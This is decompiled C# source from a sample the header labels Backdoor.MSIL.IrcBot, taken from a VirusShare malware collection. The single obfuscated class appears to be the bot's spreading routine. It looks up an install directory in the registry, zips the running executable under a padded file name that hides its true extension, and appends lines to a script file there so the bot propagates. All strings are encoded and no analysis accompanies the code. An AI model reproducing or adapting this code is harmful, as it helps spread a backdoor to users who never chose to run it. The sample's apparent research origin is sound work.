// Decompiled with JetBrains decompiler
// Type: 
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using ICSharpCode.SharpZipLib.Zip;
using Microsoft.Win32;
using System.IO;
using System.Reflection;

internal class \uE00F
{
  internal static bool \uE000()
  {
    try
    {
      string str;
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(\uE01B.\uE000("\uF779\uF745\uF74C\uF75E\uF75D\uF74B\uF758\uF74F\uF776\uF767\uF743\uF749\uF758\uF745\uF759\uF745\uF74C\uF75E\uF776\uF77D\uF743\uF744\uF74E\uF745\uF75D\uF759\uF776\uF769\uF75F\uF758\uF758\uF74F\uF744\uF75E\uF77C\uF74F\uF758\uF759\uF743\uF745\uF744\uF776\uF77F\uF744\uF743\uF744\uF759\uF75E\uF74B\uF746\uF746\uF776\uF747\uF763\uF778\uF769", 63274));
        str = subKey.GetValue(\uE01B.\uE000("\uF048\uF06F\uF072\uF075\uF060\uF06D\uF06D\uF04D\uF06E\uF062\uF060\uF075\uF068\uF06E\uF06F", 61441)).ToString();
        subKey.Close();
      }
      catch
      {
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey(\uE01B.\uE000("\uF779\uF745\uF74C\uF75E\uF75D\uF74B\uF758\uF74F\uF776\uF767\uF743\uF749\uF758\uF745\uF759\uF745\uF74C\uF75E\uF776\uF77D\uF743\uF744\uF74E\uF745\uF75D\uF759\uF776\uF769\uF75F\uF758\uF758\uF74F\uF744\uF75E\uF77C\uF74F\uF758\uF759\uF743\uF745\uF744\uF776\uF77F\uF744\uF743\uF744\uF759\uF75E\uF74B\uF746\uF746\uF776\uF747\uF763\uF778\uF769", 63274));
        str = subKey.GetValue(\uE01B.\uE000("\uF048\uF06F\uF072\uF075\uF060\uF06D\uF06D\uF04D\uF06E\uF062\uF060\uF075\uF068\uF06E\uF06F", 61441)).ToString();
        subKey.Close();
      }
      if (File.Exists(str + \uE01B.\uE000("\uF0F2\uF0ED\uF0E6\uF0EF\uF0E0\uF0E0\uF0EB\uF0E2\uF083\uF0FC\uF0FB\uF0E2\uF0EB\uF0FD\uF080\uF0D4\uF0C7\uF0DE", 61614)))
        File.Delete(str + \uE01B.\uE000("\uF0F2\uF0ED\uF0E6\uF0EF\uF0E0\uF0E0\uF0EB\uF0E2\uF083\uF0FC\uF0FB\uF0E2\uF0EB\uF0FD\uF080\uF0D4\uF0C7\uF0DE", 61614));
      ZipFile zipFile = ZipFile.Create(str + \uE01B.\uE000("\uF0F2\uF0ED\uF0E6\uF0EF\uF0E0\uF0E0\uF0EB\uF0E2\uF083\uF0FC\uF0FB\uF0E2\uF0EB\uF0FD\uF080\uF0D4\uF0C7\uF0DE", 61614));
      zipFile.BeginUpdate();
      zipFile.Add(Assembly.GetExecutingAssembly().Location, \uE01B.\uE000("\uEF4C\uEF4B\uEF52\uEF5B\uEF4D\uEF30\uEF4A\uEF46\uEF4A\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF41\uEF30\uEF7B\uEF66\uEF7B", 61214));
      zipFile.CommitUpdate();
      zipFile.Close();
      using (FileStream fileStream = new FileStream(str + \uE01B.\uE000("\uE63B\uE614\uE604\uE615\uE60E\uE617\uE613\uE649\uE60E\uE609\uE60E", 58983), FileMode.Append))
      {
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
        StreamReader streamReader = new StreamReader((Stream) fileStream);
        if (!streamReader.ReadToEnd().Contains(\uE01B.\uE000("\uE8E1\uE8BE\uE8B2\uE8A0\uE8EB\uE8EC\uE8EC\uE8AF\uE8FC\uE8EA\uE8E1\uE8EB\uE8AF\uE8AB\uE8E1\uE8E6\uE8EC\uE8E4\uE8AF\uE8CC\uE8C7\uE8CE\uE8C1\uE8C1\uE8CA\uE8C3\uE8A2\uE8DD\uE8DA\uE8C3\uE8CA\uE8DC\uE8A1\uE8F5\uE8E6\uE8FF", 59535)))
        {
          streamWriter.WriteLine(\uE01B.\uE000("\uEEC7\uEECF\uEEFF\uEEEE\uEEF5\uEEEC\uEEE8\uEEC1", 61084));
          streamWriter.WriteLine(\uE01B.\uE000("\uED17\uED0A\uED54\uED59\uED2B\uED2A\uED44\uED55\uED5E\uED2E\uED2B\uED2D\uED2A\uED5E\uED47\uED5E\uED1F", 60772));
          streamWriter.WriteLine(\uE01B.\uE000("\uE8E1\uE8BE\uE8B2\uE8A0\uE8EB\uE8EC\uE8EC\uE8AF\uE8FC\uE8EA\uE8E1\uE8EB\uE8AF\uE8AB\uE8E1\uE8E6\uE8EC\uE8E4\uE8AF\uE8CC\uE8C7\uE8CE\uE8C1\uE8C1\uE8CA\uE8C3\uE8A2\uE8DD\uE8DA\uE8C3\uE8CA\uE8DC\uE8A1\uE8F5\uE8E6\uE8FF", 59535));
          streamWriter.WriteLine(\uE01B.\uE000("\uEA32\uEA6E\uEA61\uEA21", 59996));
          streamWriter.Close();
        }
        streamReader.Close();
      }
      return true;
    }
    catch
    {
      return false;
    }
  }
}
